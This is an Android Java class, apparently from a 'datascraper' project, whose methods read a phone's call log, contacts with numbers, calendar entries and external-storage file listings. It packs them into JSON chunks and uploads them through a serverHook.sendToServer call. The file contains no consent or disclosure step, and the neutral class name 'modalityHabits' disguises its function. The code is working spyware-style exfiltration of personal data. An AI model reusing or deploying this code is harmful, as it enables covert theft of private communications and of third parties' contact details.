package com.example.alex.datascraper;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by Alex on 10/22/2017.
 */

public class modalityHabits extends AppCompatActivity {

    private final int chunkSize = 4096;

    // scrapes call logs and sends them to a server
    public void getCalls(Context mContext){

        // inbox cursor
        Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, null);

        String colName, val;
        String msgData = "[";

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                msgData += "{";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    colName = cursor.getColumnName(idx);
                    val = cursor.getString(idx);
                    if(val == null || val.equals("")){
                        msgData += "\"" + colName + "\":\"null\",";
                    }
                    else{
                        colName = colName.replace("\"", "'");
                        colName = colName.replace("\n", " ");

                        val = val.replace("\"", "'");
                        val = val.replace("\n", " ");

                        msgData += "\""
                                + colName
                                + "\":\""
                                + val
                                + "\",";
                    }

                }
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "},";
                if(msgData.length() > chunkSize){
                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "]";
                    serverHook.sendToServer("log", msgData);
                    msgData = "[";
                }

            } while (cursor.moveToNext());
        } else {
            System.out.println("No messages found");
        }
        cursor.close();
        if(msgData.length() > 1){
            msgData = msgData.substring(0, msgData.length()-1);
            msgData += "]";
            serverHook.sendToServer("log", msgData);
        }
    }

    // scrapes contacts and sends them to a server
    public void getContacts(Context mContext){
        ContentResolver cr = mContext.getContentResolver();
        Cursor phone = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if(phone == null){
            return;
        }
        Cursor conCursor;
        String id, name, number;
        String msgData = "[";
        while(phone != null && phone.moveToNext()){
            name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            name = name.replace("\"", "'");
            name = name.replace("\n", " ");
            id = phone.getString(phone.getColumnIndex(ContactsContract.Contacts._ID));
            msgData += "{";
            msgData += "\"name\":\"" + name + "\",";

            if(phone.getInt(phone.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0){
                conCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id},
                        null);
                while(conCursor.moveToNext()){
                    number = conCursor.getString(conCursor.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    msgData += "\"number\":\"" + number + "\",";
                }
                conCursor.close();
            }
            msgData = msgData.substring(0, msgData.length()-1);
            msgData += "},";
            if(msgData.length() > chunkSize){
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "]";
                serverHook.sendToServer("contact", msgData);
                msgData = "[";
            }
        }
        phone.close();
        if(msgData.length() > 1){
            msgData = msgData.substring(0, msgData.length()-1);
            msgData += "]";
            serverHook.sendToServer("contact", msgData);
        }
    }

    // scrapes call logs and sends them to a server
    public void getCalendar(Context mContext){
        // array of all texts

        String msgData = "[";
        // inbox cursor
        Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://com.android.calendar/calendars"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                String colName, val;
                msgData += "{";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    colName = cursor.getColumnName(idx);
                    val = cursor.getString(idx);
                    if(val == null || val.equals("")){
                        msgData += "\"" + colName + "\":\"null\",";
                    }
                    else{
                        colName = colName.replace("\"", "'");
                        colName = colName.replace("\n", " ");

                        val = val.replace("\"", "'");
                        val = val.replace("\n", " ");

                        msgData += "\""
                                + colName
                                + "\":\""
                                + val
                                + "\",";
                    }
                }
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "},";
                if(msgData.length() > chunkSize){
                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "]";
                    serverHook.sendToServer("calendar", msgData);
                    msgData = "[";
                }

            } while (cursor.moveToNext());
        } else {
            System.out.println("No events found");
        }
        cursor.close();
        if(msgData.length() > 1){
            msgData = msgData.substring(0, msgData.length()-1);
            msgData += "]";
            serverHook.sendToServer("calendar", msgData);
        }

    }

    // scrapes call logs and sends them to a server
    public void getStorage(Context mContext){

        String msgData = "[";

        // inbox cursor
        Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://media/external/file/"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                String colName, val;
                msgData += "{";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    colName = cursor.getColumnName(idx);
                    val = cursor.getString(idx);
                    if(val == null || val.equals("")){
                        msgData += "\"" + colName + "\":\"null\",";
                    }
                    else{
                        colName = colName.replace("\"", "'");
                        colName = colName.replace("\n", " ");

                        val = val.replace("\"", "'");
                        val = val.replace("\n", " ");

                        msgData += "\""
                                + colName
                                + "\":\""
                                + val
                                + "\",";
                    }
                }
                msgData = msgData.substring(0, msgData.length()-1);
                msgData += "},";
                if(msgData.length() > chunkSize){
                    msgData = msgData.substring(0, msgData.length()-1);
                    msgData += "]";
                    serverHook.sendToServer("file", msgData);
                    msgData = "[";
                }
            } while (cursor.moveToNext());
        } else {
            System.out.println("No events found");
        }
        cursor.close();
        if(msgData.length() > 1){
            msgData = msgData.substring(0, msgData.length()-1);
            msgData += "]";
            serverHook.sendToServer("file", msgData);
        }


    }

}
